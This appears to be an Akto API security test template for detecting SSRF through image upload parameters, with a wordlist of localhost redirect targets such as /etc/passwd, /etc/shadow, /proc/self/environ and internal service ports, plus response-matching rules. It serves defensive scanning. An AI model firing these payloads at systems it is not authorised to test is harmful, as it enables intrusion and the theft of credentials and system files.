id: SSRF_ON_IMAGE_UPLOAD_LOCALHOST_REDIRECT
info:
  name: "Sensitive localhost details exposed via replacing Image param with redirection due to SSRF"
  description: "The endpoint appears to be vulnerable to Server Side Request Forgery attack. The original request was replayed by replacing Image upload parameter with url that redirects to Localhost endpoint. The application responded with 2XX success code and also gave out sensitive Localhost information in response."
  details: >
    "The endpoint appears to be vulnerable to Server Side Request Forgery attack. The original request was replayed by replacing Image upload parameter with url that redirects to Localhost endpoint. The application responded with 2XX success code and also gave out sensitive localhost information in response. Server-Side Request Forgery (SSRF) flaws occur whenever an API is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or a VPN.\n
    "Modern concepts in application development make SSRF more common and more dangerous.\n"
    "More common - the following concepts encourage developers to access an external resource based on user input: Webhooks, file fetching from URLs, custom SSO, and URL previews.\n"
    "More dangerous - Modern technologies like cloud providers, Kubernetes, and Docker expose management and control channels over HTTP on predictable, well-known paths. Those channels are an easy target for an SSRF attack.\n"
    "It is also more challenging to limit outbound traffic from your application, because of the connected nature of modern applications.\n" +
    "The SSRF risk can not always be completely eliminated. While choosing a protection mechanism, it is important to consider the business risks and needs."
  impact: "Successful exploitation might compromise sensitive localhost information which attacker can use to get unauthorized access to localhost."
  remediation: "To mitigate the exposure of sensitive localhost details due to SSRF via image parameter manipulation, enforce strict input validation to prevent unauthorized URL redirections. Implement server-side checks to detect and block requests attempting to access sensitive localhost endpoints. Utilize network-level protections like firewalls to restrict outbound traffic and prevent SSRF attacks from reaching local services. Regularly audit server logs for unusual activities, including SSRF attempts, and promptly respond to mitigate any potential risks."
  category:
    name: SSRF
    shortName: Server Side Request Forgery
    displayName: Server Side Request Forgery (SSRF)
  subCategory: SSRF_ON_IMAGE_UPLOAD_LOCALHOST_REDIRECT
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa7-server-side-request-forgery.md"
    - "https://www.akto.io/blog/how-to-prevent-server-side-request-forgery-ssrf-as-a-developer"
  cwe:
    - CWE-918
  cve:
    - CVE-2022-4725
  
api_selection_filters:
  response_code:
    and:
      gte: 200
      lt: 205
  or:
    - request_payload:
        for_one:
          value:
            contains_either:
                - .jpg
          key:
            extract: image_key
    - query_param:
        for_one:
          value:
            contains_either:
                - .jpg
          key:
            extract: image_key
wordLists:
  redirect_urls:
    - http://localhost:80
    - http://localhost:8080
    - http://localhost/etc/passwd
    - http://localhost/etc/lsb-release
    - http://localhost/etc/shadow
    - http://localhost:443
    - http://localhost/admin
    - http://localhost/etc/hosts
    - http://localhost:22
    - http://localhost/proc/self/environ
    - http://localhost/proc/self/cmdline
    - http://localhost/proc/self/cwd/index.php
    - http://localhost/proc/self/exe
    - http://localhost/proc/self/cwd/main.py
    - http://localhost/proc/self/cwd/application.py
    - http://localhost:27017

execute:
  type: single
  requests:
      - req:
        - send_ssrf_req:
            url: "https://test-services.akto.io/store_uuid/${random_uuid}.jpg"
            redirect_url: ${redirect_urls}
        - follow_redirect: true
        - modify_query_param:
            image_key: https://test-services.akto.io/store_uuid/${random_uuid}.jpg
        - modify_body_param:
            image_key: https://test-services.akto.io/store_uuid/${random_uuid}.jpg

validate:
  response_code:
    gte: 200
    lt: 300
  ssrf_url_hit: ${random_uuid}
  response_payload:
    contains_either:
      - admin_menu
      - wp-json/wp
      - "Django administration"
      - "staff_member_required"
      - "Flask-Admin"
      - "flask_admin"
      - "ActiveAdmin"
      - "rails_admin"
      - "Express Admin"
      - "express_admin"
      - "laravel_admin"
      - wp-admin
      - loopback
      - HTTP/
      - "Server:"
      - "SSH-"
      - "mongod"
      - "handshake"
      - "Spring Boot Admin"
      - "Spring Security"
      - "@Controller"
      - "@RequestMapping"
      - "Spring Actuator"
      - "gorilla/mux"
      - "net/http"
      - "gin-gonic/gin"
    not_contains_either:
      - Access Denied
      - Error
      - SSRF
      - Blocked
      - WAF
      - Rejected
      - Security Exception
      - Invalid Request
      - Connection Refused
      - Failed
